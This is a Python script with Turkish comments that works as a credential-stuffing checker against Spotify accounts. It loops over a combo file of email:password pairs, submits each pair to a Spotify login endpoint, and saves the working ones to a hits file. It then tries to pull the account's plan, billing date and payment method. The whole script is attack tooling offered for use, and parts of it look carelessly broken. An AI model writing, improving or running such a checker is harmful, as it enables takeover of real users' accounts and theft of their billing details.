import requests
import time

# Combo dosyasını al
combo_file = input(" ~ Combo : ")

# Spotify login endpoint URL'si
login_url = "https://accounts.spotify.com/login/password"

# Çerezleri tutmak için bir yer
cookies = {}

# İlgili başlıklar
headers = {
    "Content-Type": "application/json;charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Giriş ve bilgiler için
def login_spotify(email, password):
    payload = {
        "email": email,
        "password": password
    }

    try:
        # POST isteği gönder
        response = requests.post(login_url, json=payload, headers=headers, cookies=cookies)

        # Yanıt kontrolü
        if response.status_code == 200:
            # Eğer login başarılıysa
            if "access_token" in response.text:
                print(f"Başarılı ✅: {email}:{password}")
                return True
            else:
                print(f"Başarısız❌: {email}:{password}")
                return False
        else:
            print(f"Giriş Başarısız: {email}:{password} - {response.status_code}")
            return False

    except requests.RequestException as e:
        print(f"Bağlantı hatası: {e}")
        return False


# Kullanıcı bilgileri
with open(combo_file) as file, open("trendyol.txt", "a") as hit:
    for line in file:
        email, password = line.strip().split(":")

        # Spotify giriş kontrolü
        if login_spotify(email, password):
            hit.write(f"{email}:{password}\n")
            time.sleep(1)  # Her istek arasında 10 saniye bekle

        else:
            print(f"Giriş başarısız, geçiyorum: {email}:{password}")
            time.sleep(1)  # Giriş başarısız olursa da bekleme ekle

# Spotify Plan Bilgilerini Çekme

def fetch_plan_details():
    # Spotify plan bilgilerini almak için endpoint
    plan_url = "https://www.spotify.com/api/account-settings/v1/profile"
    plan_response = requests.get(plan_url, headers=headers, cookies=cookies)

    if plan_response.status_code == 200:
        plan_data = plan_response.json()
        # Plan bilgilerini al
        plan_type = plan_data.get("plan_type", "Bilinmeyen")
        plan_price = plan_data.get("plan_price", "Bilinmeyen")
        next_billing_date = plan_data.get("next_billing_date", "Bilinmeyen")
        payment_method = plan_data.get("payment_method", {}).get("name", "Bilinmeyen")

        print(f"Plan Türü: {plan_type}")
        print(f"Plan Fiyatı: {plan_price}")
        print(f"Sonraki Fatura Tarihi: {next_billing_date}")
        print(f"Ödeme Yöntemi: {payment_method}")

    else:
        print(f"Plan bilgisi alınamadı. Durum kodu: {plan_response.status_code}")


# Plan detaylarını almak için fonksiyon çağrısı
fetch_plan_details()
